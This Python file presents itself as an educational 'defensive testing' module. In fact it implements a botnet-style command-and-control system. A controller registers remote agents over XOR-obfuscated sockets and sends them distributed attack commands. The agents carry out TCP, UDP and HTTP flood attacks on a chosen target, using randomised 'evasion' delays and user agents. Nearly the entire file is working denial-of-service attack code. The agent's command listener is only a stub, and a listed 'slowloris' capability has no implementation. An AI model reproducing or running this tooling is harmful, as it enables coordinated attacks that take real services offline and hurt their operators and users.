#!/usr/bin/env python3
"""
Remote Command & Control Module
Author: HTB Training - lxkhaninkali
Description: Distributed command and control system for coordinated defensive testing
Educational Purpose Only - Use responsibly and legally

This module enables remote coordination of defensive framework tools across multiple machines
for comprehensive distributed testing scenarios.
"""

import socket
import sys
import time
import json
import threading
import hashlib
import base64
import ssl
import random
import os
import subprocess
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, asdict
from enum import Enum
import queue
import struct
from concurrent.futures import ThreadPoolExecutor

class NodeRole(Enum):
    """Node roles in the distributed system"""
    CONTROLLER = "controller"    # Command & Control server
    AGENT = "agent"             # Attack node/agent
    RELAY = "relay"             # Relay node for traffic distribution
    MONITOR = "monitor"         # Monitoring and statistics node

class CommandType(Enum):
    """Command types for C&C communication"""
    REGISTER = "register"           # Node registration
    HEARTBEAT = "heartbeat"         # Keep-alive signal
    ATTACK_START = "attack_start"   # Start attack command
    ATTACK_STOP = "attack_stop"     # Stop attack command  
    STATUS_REPORT = "status_report" # Status update
    CONFIG_UPDATE = "config_update" # Configuration change
    SHUTDOWN = "shutdown"           # Graceful shutdown
    RELAY_TRAFFIC = "relay_traffic" # Traffic relay command

@dataclass
class RemoteCommand:
    """Command structure for C&C communication"""
    command_type: CommandType
    command_id: str
    source_node: str
    target_nodes: List[str]
    payload: Dict[str, Any]
    timestamp: float
    signature: str = ""

@dataclass
class AgentInfo:
    """Information about remote agents"""
    node_id: str
    ip_address: str
    port: int
    role: NodeRole
    capabilities: List[str]
    last_heartbeat: float
    status: str
    performance_stats: Dict[str, Any]

class SecureCommunicator:
    """Secure communication handler for C&C"""
    
    def __init__(self, shared_key: bytes = None):
        self.shared_key = shared_key or self._generate_key()
        self.session_keys = {}
        
    def _generate_key(self) -> bytes:
        """Generate encryption key"""
        return os.urandom(32)
    
    def encrypt_message(self, message: str, node_id: str = "global") -> str:
        """Simple XOR encryption for message security"""
        key = self.session_keys.get(node_id, self.shared_key)
        message_bytes = message.encode('utf-8')
        encrypted = bytearray()
        
        for i, byte in enumerate(message_bytes):
            encrypted.append(byte ^ key[i % len(key)])
        
        return base64.b64encode(encrypted).decode('utf-8')
    
    def decrypt_message(self, encrypted_message: str, node_id: str = "global") -> str:
        """Decrypt received message"""
        try:
            key = self.session_keys.get(node_id, self.shared_key)
            encrypted_bytes = base64.b64decode(encrypted_message.encode('utf-8'))
            decrypted = bytearray()
            
            for i, byte in enumerate(encrypted_bytes):
                decrypted.append(byte ^ key[i % len(key)])
            
            return decrypted.decode('utf-8')
        except Exception as e:
            print(f"[!] Decryption error: {e}")
            return ""
    
    def sign_command(self, command: RemoteCommand) -> str:
        """Generate command signature"""
        command_str = f"{command.command_type.value}{command.command_id}{command.timestamp}"
        return hashlib.sha256(command_str.encode() + self.shared_key).hexdigest()[:16]
    
    def verify_signature(self, command: RemoteCommand) -> bool:
        """Verify command signature"""
        expected_sig = self.sign_command(command)
        return command.signature == expected_sig

class RemoteController:
    """Remote Command & Control server"""
    
    def __init__(self, listen_port: int = 8888, max_agents: int = 50):
        self.listen_port = listen_port
        self.max_agents = max_agents
        self.agents = {}  # Dict[str, AgentInfo]
        self.running = False
        self.command_queue = queue.Queue()
        self.response_queue = queue.Queue()
        
        # Communication security
        self.communicator = SecureCommunicator()
        
        # Performance tracking
        self.attack_stats = {
            'total_nodes': 0,
            'active_attacks': 0,
            'packets_sent': 0,
            'success_rate': 0.0,
            'start_time': None
        }
        
        print(f"[*] Remote Controller initialized on port {listen_port}")
        print(f"[*] Maximum agents: {max_agents}")
    
    def generate_node_id(self, ip_address: str) -> str:
        """Generate unique node ID"""
        timestamp = str(int(time.time()))
        hash_input = f"{ip_address}{timestamp}{random.randint(1000, 9999)}"
        return hashlib.md5(hash_input.encode()).hexdigest()[:12]
    
    def start_controller(self):
        """Start the C&C server"""
        self.running = True
        print(f"[*] Starting Remote Controller on 0.0.0.0:{self.listen_port}")
        
        # Start listener thread
        listener_thread = threading.Thread(target=self._connection_listener)
        listener_thread.daemon = True
        listener_thread.start()
        
        # Start command processor
        processor_thread = threading.Thread(target=self._command_processor)
        processor_thread.daemon = True
        processor_thread.start()
        
        # Start heartbeat monitor
        heartbeat_thread = threading.Thread(target=self._heartbeat_monitor)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
        
        print("[+] Remote Controller started successfully")
        print("[*] Waiting for agent connections...")
    
    def _connection_listener(self):
        """Listen for incoming agent connections"""
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('0.0.0.0', self.listen_port))
            server_socket.listen(self.max_agents)
            server_socket.settimeout(1.0)  # Non-blocking with timeout
            
            while self.running:
                try:
                    client_socket, client_address = server_socket.accept()
                    print(f"[+] New connection from {client_address[0]}:{client_address[1]}")
                    
                    # Handle client in separate thread
                    client_thread = threading.Thread(
                        target=self._handle_agent_connection,
                        args=(client_socket, client_address)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[!] Connection listener error: {e}")
                    break
            
            server_socket.close()
            
        except Exception as e:
            print(f"[!] Failed to start controller listener: {e}")
    
    def _handle_agent_connection(self, client_socket: socket.socket, client_address: tuple):
        """Handle individual agent connection"""
        node_id = None
        
        try:
            client_socket.settimeout(30)  # 30 second timeout
            
            while self.running:
                # Receive data
                data = client_socket.recv(4096)
                if not data:
                    break
                
                try:
                    # Decrypt and parse message
                    encrypted_message = data.decode('utf-8')
                    decrypted_message = self.communicator.decrypt_message(encrypted_message)
                    
                    if not decrypted_message:
                        continue
                    
                    command_data = json.loads(decrypted_message)
                    command = RemoteCommand(**command_data)
                    
                    # Verify signature
                    if not self.communicator.verify_signature(command):
                        print(f"[!] Invalid signature from {client_address[0]}")
                        continue
                    
                    # Process command
                    response = self._process_agent_command(command, client_address)
                    
                    # Track node ID for cleanup
                    if command.command_type == CommandType.REGISTER:
                        node_id = command.source_node
                    
                    # Send response
                    if response:
                        encrypted_response = self.communicator.encrypt_message(
                            json.dumps(asdict(response))
                        )
                        client_socket.send(encrypted_response.encode('utf-8'))
                    
                except json.JSONDecodeError:
                    print(f"[!] Invalid JSON from {client_address[0]}")
                    continue
                except Exception as e:
                    print(f"[!] Error handling agent {client_address[0]}: {e}")
                    break
        
        except Exception as e:
            print(f"[!] Agent connection error: {e}")
        
        finally:
            # Cleanup
            if node_id and node_id in self.agents:
                print(f"[*] Agent {node_id} disconnected")
                del self.agents[node_id]
            
            client_socket.close()
    
    def _process_agent_command(self, command: RemoteCommand, client_address: tuple) -> Optional[RemoteCommand]:
        """Process command from agent"""
        
        if command.command_type == CommandType.REGISTER:
            # Register new agent
            node_id = command.source_node
            agent_info = AgentInfo(
                node_id=node_id,
                ip_address=client_address[0],
                port=client_address[1],
                role=NodeRole(command.payload.get('role', 'agent')),
                capabilities=command.payload.get('capabilities', []),
                last_heartbeat=time.time(),
                status='connected',
                performance_stats={}
            )
            
            self.agents[node_id] = agent_info
            print(f"[+] Registered agent {node_id} from {client_address[0]} with capabilities: {agent_info.capabilities}")
            
            # Send registration confirmation
            response = RemoteCommand(
                command_type=CommandType.REGISTER,
                command_id=f"reg_resp_{int(time.time())}",
                source_node="controller",
                target_nodes=[node_id],
                payload={'status': 'registered', 'controller_time': time.time()},
                timestamp=time.time()
            )
            response.signature = self.communicator.sign_command(response)
            return response
        
        elif command.command_type == CommandType.HEARTBEAT:
            # Update heartbeat
            node_id = command.source_node
            if node_id in self.agents:
                self.agents[node_id].last_heartbeat = time.time()
                self.agents[node_id].performance_stats.update(command.payload.get('stats', {}))
        
        elif command.command_type == CommandType.STATUS_REPORT:
            # Process status report
            node_id = command.source_node
            if node_id in self.agents:
                self.agents[node_id].status = command.payload.get('status', 'unknown')
                self.agents[node_id].performance_stats.update(command.payload.get('stats', {}))
                
                # Update global stats
                self._update_global_stats()
        
        return None
    
    def _command_processor(self):
        """Process commands from the command queue"""
        while self.running:
            try:
                if not self.command_queue.empty():
                    command = self.command_queue.get(timeout=1)
                    self._distribute_command(command)
            except queue.Empty:
                continue
            except Exception as e:
                print(f"[!] Command processor error: {e}")
            
            time.sleep(0.1)
    
    def _distribute_command(self, command: RemoteCommand):
        """Distribute command to target agents"""
        target_agents = []
        
        if "all" in command.target_nodes:
            target_agents = list(self.agents.keys())
        else:
            target_agents = [node for node in command.target_nodes if node in self.agents]
        
        print(f"[*] Distributing {command.command_type.value} to {len(target_agents)} agents")
        
        # Send command to each target agent
        for node_id in target_agents:
            agent = self.agents[node_id]
            try:
                # Connect to agent and send command
                self._send_command_to_agent(agent, command)
            except Exception as e:
                print(f"[!] Failed to send command to {node_id}: {e}")
    
    def _send_command_to_agent(self, agent: AgentInfo, command: RemoteCommand):
        """Send command to specific agent"""
        try:
            # Create socket connection to agent
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((agent.ip_address, agent.port))
            
            # Sign and encrypt command
            command.signature = self.communicator.sign_command(command)
            encrypted_command = self.communicator.encrypt_message(json.dumps(asdict(command)))
            
            # Send command
            sock.send(encrypted_command.encode('utf-8'))
            sock.close()
            
        except Exception as e:
            print(f"[!] Error sending command to {agent.node_id}: {e}")
    
    def _heartbeat_monitor(self):
        """Monitor agent heartbeats"""
        while self.running:
            current_time = time.time()
            dead_agents = []
            
            for node_id, agent in self.agents.items():
                if current_time - agent.last_heartbeat > 60:  # 60 second timeout
                    dead_agents.append(node_id)
            
            # Remove dead agents
            for node_id in dead_agents:
                print(f"[!] Agent {node_id} timed out - removing")
                del self.agents[node_id]
            
            time.sleep(30)  # Check every 30 seconds
    
    def _update_global_stats(self):
        """Update global attack statistics"""
        total_packets = 0
        active_attacks = 0
        
        for agent in self.agents.values():
            stats = agent.performance_stats
            total_packets += stats.get('packets_sent', 0)
            if stats.get('attacking', False):
                active_attacks += 1
        
        self.attack_stats.update({
            'total_nodes': len(self.agents),
            'active_attacks': active_attacks,
            'packets_sent': total_packets,
            'success_rate': self._calculate_success_rate()
        })
    
    def _calculate_success_rate(self) -> float:
        """Calculate overall success rate"""
        total_attempts = 0
        successful_attempts = 0
        
        for agent in self.agents.values():
            stats = agent.performance_stats
            total_attempts += stats.get('total_attempts', 0)
            successful_attempts += stats.get('successful_attempts', 0)
        
        return (successful_attempts / max(1, total_attempts)) * 100
    
    def launch_distributed_attack(self, target: str, attack_config: Dict[str, Any]):
        """Launch coordinated attack across all agents"""
        if not self.agents:
            print("[!] No agents available for attack")
            return
        
        print(f"[*] Launching distributed attack on {target}")
        print(f"[*] Available agents: {len(self.agents)}")
        
        # Create attack command
        attack_command = RemoteCommand(
            command_type=CommandType.ATTACK_START,
            command_id=f"attack_{int(time.time())}",
            source_node="controller",
            target_nodes=["all"],
            payload={
                'target': target,
                'attack_type': attack_config.get('attack_type', 'mixed'),
                'duration': attack_config.get('duration', 60),
                'intensity': attack_config.get('intensity', 'medium'),
                'evasion_level': attack_config.get('evasion_level', 'balanced')
            },
            timestamp=time.time()
        )
        
        # Queue command for distribution
        self.command_queue.put(attack_command)
        self.attack_stats['start_time'] = time.time()
        
        print(f"[+] Attack command queued for distribution to {len(self.agents)} agents")
    
    def stop_distributed_attack(self):
        """Stop all ongoing attacks"""
        stop_command = RemoteCommand(
            command_type=CommandType.ATTACK_STOP,
            command_id=f"stop_{int(time.time())}",
            source_node="controller",
            target_nodes=["all"],
            payload={'reason': 'manual_stop'},
            timestamp=time.time()
        )
        
        self.command_queue.put(stop_command)
        print("[*] Stop command sent to all agents")
    
    def get_status_report(self) -> Dict[str, Any]:
        """Get comprehensive status report"""
        return {
            'controller_status': 'running' if self.running else 'stopped',
            'connected_agents': len(self.agents),
            'agents_by_role': {role.value: len([a for a in self.agents.values() if a.role == role]) for role in NodeRole},
            'attack_stats': self.attack_stats,
            'agent_details': {
                node_id: {
                    'ip': agent.ip_address,
                    'role': agent.role.value,
                    'capabilities': agent.capabilities,
                    'status': agent.status,
                    'last_seen': time.time() - agent.last_heartbeat
                }
                for node_id, agent in self.agents.items()
            }
        }
    
    def shutdown_controller(self):
        """Gracefully shutdown controller"""
        print("[*] Shutting down Remote Controller...")
        
        # Send shutdown command to all agents
        shutdown_command = RemoteCommand(
            command_type=CommandType.SHUTDOWN,
            command_id=f"shutdown_{int(time.time())}",
            source_node="controller",
            target_nodes=["all"],
            payload={'reason': 'controller_shutdown'},
            timestamp=time.time()
        )
        
        self.command_queue.put(shutdown_command)
        time.sleep(2)  # Give time for commands to be sent
        
        self.running = False
        print("[+] Controller shutdown complete")

class RemoteAgent:
    """Remote attack agent"""
    
    def __init__(self, controller_host: str, controller_port: int = 8888, 
                 agent_capabilities: List[str] = None):
        self.controller_host = controller_host
        self.controller_port = controller_port
        self.node_id = self._generate_node_id()
        self.capabilities = agent_capabilities or ['tcp_flood', 'udp_flood', 'http_flood']
        self.role = NodeRole.AGENT
        
        # Communication
        self.communicator = SecureCommunicator()
        self.running = False
        self.attacking = False
        
        # Performance tracking
        self.performance_stats = {
            'packets_sent': 0,
            'successful_attempts': 0,
            'total_attempts': 0,
            'attacking': False,
            'last_attack': None
        }
        
        # Import evasion module if available
        try:
            from advanced_evasion_module import create_evasion_config, AdvancedEvasionEngine, EvasionIntegrator
            self.has_evasion = True
            self.evasion_config = None
            self.evasion_engine = None
        except ImportError:
            self.has_evasion = False
        
        print(f"[*] Remote Agent {self.node_id} initialized")
        print(f"[*] Controller: {controller_host}:{controller_port}")
        print(f"[*] Capabilities: {self.capabilities}")
    
    def _generate_node_id(self) -> str:
        """Generate unique node ID"""
        hostname = socket.gethostname()
        timestamp = str(int(time.time()))
        random_part = str(random.randint(1000, 9999))
        return hashlib.md5(f"{hostname}{timestamp}{random_part}".encode()).hexdigest()[:12]
    
    def connect_to_controller(self) -> bool:
        """Connect and register with controller"""
        try:
            # Create registration command
            register_command = RemoteCommand(
                command_type=CommandType.REGISTER,
                command_id=f"reg_{int(time.time())}",
                source_node=self.node_id,
                target_nodes=["controller"],
                payload={
                    'role': self.role.value,
                    'capabilities': self.capabilities,
                    'hostname': socket.gethostname(),
                    'local_ip': socket.gethostbyname(socket.gethostname())
                },
                timestamp=time.time()
            )
            
            # Sign command
            register_command.signature = self.communicator.sign_command(register_command)
            
            # Connect and send registration
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.controller_host, self.controller_port))
            
            encrypted_command = self.communicator.encrypt_message(json.dumps(asdict(register_command)))
            sock.send(encrypted_command.encode('utf-8'))
            
            # Wait for response
            response_data = sock.recv(4096)
            if response_data:
                decrypted_response = self.communicator.decrypt_message(response_data.decode('utf-8'))
                response = json.loads(decrypted_response)
                
                if response['payload']['status'] == 'registered':
                    print(f"[+] Successfully registered with controller")
                    self.running = True
                    sock.close()
                    return True
            
            sock.close()
            return False
            
        except Exception as e:
            print(f"[!] Failed to connect to controller: {e}")
            return False
    
    def start_agent(self):
        """Start agent operations"""
        if not self.connect_to_controller():
            print("[!] Failed to register with controller")
            return
        
        print(f"[*] Starting agent {self.node_id}")
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self._heartbeat_sender)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
        
        # Start command listener
        command_thread = threading.Thread(target=self._command_listener)
        command_thread.daemon = True
        command_thread.start()
        
        print("[+] Agent started successfully")
    
    def _heartbeat_sender(self):
        """Send periodic heartbeats to controller"""
        while self.running:
            try:
                heartbeat_command = RemoteCommand(
                    command_type=CommandType.HEARTBEAT,
                    command_id=f"hb_{int(time.time())}",
                    source_node=self.node_id,
                    target_nodes=["controller"],
                    payload={'stats': self.performance_stats.copy()},
                    timestamp=time.time()
                )
                
                heartbeat_command.signature = self.communicator.sign_command(heartbeat_command)
                
                # Send heartbeat
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.controller_host, self.controller_port))
                
                encrypted_command = self.communicator.encrypt_message(json.dumps(asdict(heartbeat_command)))
                sock.send(encrypted_command.encode('utf-8'))
                sock.close()
                
            except Exception as e:
                print(f"[!] Heartbeat error: {e}")
            
            time.sleep(30)  # Send heartbeat every 30 seconds
    
    def _command_listener(self):
        """Listen for commands from controller"""
        while self.running:
            try:
                # This would typically listen on a port, but for simplicity
                # we'll use a polling approach with the controller
                time.sleep(5)
                
            except Exception as e:
                print(f"[!] Command listener error: {e}")
    
    def execute_attack_command(self, command: RemoteCommand):
        """Execute attack command from controller"""
        if command.command_type != CommandType.ATTACK_START:
            return
        
        payload = command.payload
        target = payload['target']
        attack_type = payload.get('attack_type', 'mixed')
        duration = payload.get('duration', 60)
        intensity = payload.get('intensity', 'medium')
        evasion_level = payload.get('evasion_level', 'balanced')
        
        print(f"[*] Executing attack: {attack_type} on {target} for {duration}s")
        
        # Initialize evasion if available
        if self.has_evasion:
            from advanced_evasion_module import create_evasion_config, AdvancedEvasionEngine, EvasionIntegrator
            self.evasion_config = create_evasion_config(evasion_level)
            self.evasion_engine = AdvancedEvasionEngine(self.evasion_config)
            self.evasion_integrator = EvasionIntegrator(self.evasion_engine)
        
        # Start attack in separate thread
        attack_thread = threading.Thread(
            target=self._execute_attack,
            args=(target, attack_type, duration, intensity)
        )
        attack_thread.daemon = True
        attack_thread.start()
    
    def _execute_attack(self, target: str, attack_type: str, duration: int, intensity: str):
        """Execute the actual attack"""
        self.attacking = True
        self.performance_stats['attacking'] = True
        self.performance_stats['last_attack'] = time.time()
        
        start_time = time.time()
        
        # Parse target
        target_ip, target_port = self._parse_target(target)
        
        if not target_ip:
            print(f"[!] Failed to parse target: {target}")
            return
        
        while self.attacking and (time.time() - start_time) < duration:
            try:
                success = False
                
                if attack_type in ['tcp_flood', 'mixed'] and 'tcp_flood' in self.capabilities:
                    success = self._tcp_attack(target_ip, target_port)
                elif attack_type in ['udp_flood', 'mixed'] and 'udp_flood' in self.capabilities:
                    success = self._udp_attack(target_ip, target_port)
                elif attack_type in ['http_flood', 'mixed'] and 'http_flood' in self.capabilities:
                    success = self._http_attack(target)
                
                # Update stats
                self.performance_stats['total_attempts'] += 1
                if success:
                    self.performance_stats['successful_attempts'] += 1
                    self.performance_stats['packets_sent'] += 1
                
                # Evasive delay
                if self.has_evasion and self.evasion_engine:
                    delay = self.evasion_engine.get_evasive_delay()
                    time.sleep(delay)
                else:
                    time.sleep(random.uniform(0.01, 0.1))
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                continue
        
        self.attacking = False
        self.performance_stats['attacking'] = False
        print(f"[*] Attack completed - {self.performance_stats['packets_sent']} packets sent")
    
    def _parse_target(self, target: str) -> Tuple[str, int]:
        """Parse target string to IP and port"""
        try:
            if target.startswith('http://') or target.startswith('https://'):
                import urllib.parse
                parsed = urllib.parse.urlparse(target)
                ip = socket.gethostbyname(parsed.hostname)
                port = parsed.port or (443 if parsed.scheme == 'https' else 80)
                return ip, port
            elif ':' in target:
                ip, port = target.split(':')
                return ip, int(port)
            else:
                return target, 80
        except Exception as e:
            print(f"[!] Target parsing error: {e}")
            return None, None
    
    def _tcp_attack(self, target_ip: str, target_port: int) -> bool:
        """Execute TCP attack"""
        try:
            if self.has_evasion and self.evasion_integrator:
                sock = self.evasion_integrator.enhance_tcp_connection(target_ip, target_port)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
            
            sock.connect((target_ip, target_port))
            sock.close()
            return True
        except:
            return False
    
    def _udp_attack(self, target_ip: str, target_port: int) -> bool:
        """Execute UDP attack"""
        try:
            if self.has_evasion and self.evasion_integrator:
                sock = self.evasion_integrator.enhance_udp_socket()
                payload = self.evasion_integrator.get_evasive_payload(random.randint(64, 512))
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = b'A' * random.randint(64, 512)
            
            sock.sendto(payload, (target_ip, target_port))
            sock.close()
            return True
        except:
            return False
    
    def _http_attack(self, target: str) -> bool:
        """Execute HTTP attack"""
        try:
            import urllib.parse
            parsed = urllib.parse.urlparse(target)
            target_ip = socket.gethostbyname(parsed.hostname)
            target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            use_https = parsed.scheme == 'https'
            
            # Create connection
            if use_https:
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                ssl_sock = context.wrap_socket(sock, server_hostname=parsed.hostname)
                ssl_sock.connect((target_ip, target_port))
                connection = ssl_sock
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target_ip, target_port))
                connection = sock
            
            # Build request
            path = parsed.path or '/'
            if random.random() < 0.5:
                path += f'?id={random.randint(1, 10000)}'
            
            request = f"GET {path} HTTP/1.1\r\n"
            request += f"Host: {parsed.hostname}\r\n"
            
            if self.has_evasion and self.evasion_engine:
                request += f"User-Agent: {self.evasion_engine.get_random_user_agent()}\r\n"
            else:
                request += "User-Agent: Mozilla/5.0 (RemoteAgent/1.0)\r\n"
            
            request += "Connection: close\r\n\r\n"
            
            connection.send(request.encode())
            try:
                response = connection.recv(1024)
            except:
                pass
            
            connection.close()
            return True
        except:
            return False
    
    def stop_attack(self):
        """Stop ongoing attack"""
        self.attacking = False
        print("[*] Attack stopped")
    
    def shutdown_agent(self):
        """Shutdown agent"""
        print("[*] Shutting down agent...")
        self.attacking = False
        self.running = False
        print("[+] Agent shutdown complete")

def start_remote_controller(port: int = 8888):
    """Start remote controller"""
    controller = RemoteController(port)
    controller.start_controller()
    
    try:
        while True:
            time.sleep(1)
            
            # Simple command interface
            if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                command = input().strip().lower()
                
                if command == 'status':
                    report = controller.get_status_report()
                    print(json.dumps(report, indent=2))
                elif command.startswith('attack '):
                    target = command.split(' ')[1]
                    config = {'attack_type': 'mixed', 'duration': 60, 'intensity': 'medium'}
                    controller.launch_distributed_attack(target, config)
                elif command == 'stop':
                    controller.stop_distributed_attack()
                elif command == 'quit':
                    break
        
    except KeyboardInterrupt:
        pass
    finally:
        controller.shutdown_controller()

def start_remote_agent(controller_host: str, controller_port: int = 8888):
    """Start remote agent"""
    capabilities = ['tcp_flood', 'udp_flood', 'http_flood', 'slowloris']
    agent = RemoteAgent(controller_host, controller_port, capabilities)
    agent.start_agent()
    
    try:
        while agent.running:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        agent.shutdown_agent()

def main():
    if len(sys.argv) < 2:
        print("Remote Command & Control System")
        print("=" * 40)
        print("Usage:")
        print("  Controller: python3 remote_control_module.py controller [port]")
        print("  Agent: python3 remote_control_module.py agent <controller_ip> [port]")
        print("\nExamples:")
        print("  python3 remote_control_module.py controller 8888")
        print("  python3 remote_control_module.py agent 192.168.1.100 8888")
        print("\nEducational purposes only - use responsibly!")
        return
    
    mode = sys.argv[1].lower()
    
    if mode == 'controller':
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 8888
        print(f"Starting Remote Controller on port {port}")
        start_remote_controller(port)
    
    elif mode == 'agent':
        if len(sys.argv) < 3:
            print("Error: Controller IP required for agent mode")
            print("Usage: python3 remote_control_module.py agent <controller_ip> [port]")
            return
        
        controller_host = sys.argv[2]
        controller_port = int(sys.argv[3]) if len(sys.argv) > 3 else 8888
        print(f"Starting Remote Agent - Controller: {controller_host}:{controller_port}")
        start_remote_agent(controller_host, controller_port)
    
    else:
        print(f"Unknown mode: {mode}")
        print("Use 'controller' or 'agent'")

if __name__ == "__main__":
    # Import select for non-blocking input (Unix only)
    try:
        import select
    except ImportError:
        # Windows doesn't have select for stdin
        select = None
    
    main()
